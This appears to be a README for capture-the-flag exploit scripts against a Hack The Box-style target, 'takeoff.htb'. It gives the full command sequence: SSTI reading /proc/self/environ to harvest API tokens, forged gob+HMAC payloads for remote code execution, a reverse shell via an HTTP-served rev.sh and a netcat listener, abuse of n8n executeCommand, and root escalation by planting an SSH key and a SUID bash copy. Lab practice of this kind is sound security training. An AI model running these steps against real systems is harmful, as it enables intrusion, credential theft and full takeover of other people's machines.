# Takeoff scripts

Fill `../secrets.example.env` → `../secrets.env` locally. `takeoff.htb` in `/etc/hosts`.

```bash
export TARGET=<ip> LHOST=<tun0>
chmod +x *.sh *.py
./replay.sh hosts
./replay.sh book
./replay.sh ssti /proc/self/environ
# paste TICKET_VALIDATION_TOKEN + N8N_API_KEY into secrets.env
# terminal A:  python3 -m http.server 8888   (rev.sh in cwd)
# terminal B:  nc -lvnp 4444
./replay.sh rce
# on the reverse shell:
python3 04-n8n-exec.py --cmd 'id'
```

| File | Where | What |
|------|-------|------|
| `01-book.py` | Kali | register, 4242 card, book Coach |
| `02-ssti-read.py` | Kali | `{{.File}}` via PDF notes |
| `03-checkin-rce.py` | Kali | gob+HMAC `NotifyCmd` |
| `forge_checkin.go` | Kali | encoder (`go run .`) |
| `04-n8n-exec.py` | **target** | n8n webhook + executeCommand |
| `wf-flex.json` | target | workflow body (`?cmd=`) |
| `replay.sh` | Kali | wrapper |

`pdftotext` (poppler-utils) is required for SSTI output. The HMAC key is 64 ASCII bytes from the process environment — do not base64-decode it.

After n8n root: drop an SSH key into the bind-mounted home, `cp /bin/bash ~/rootbash` as the host user, `chmod 4755` from the container, `./rootbash -p` on the host.
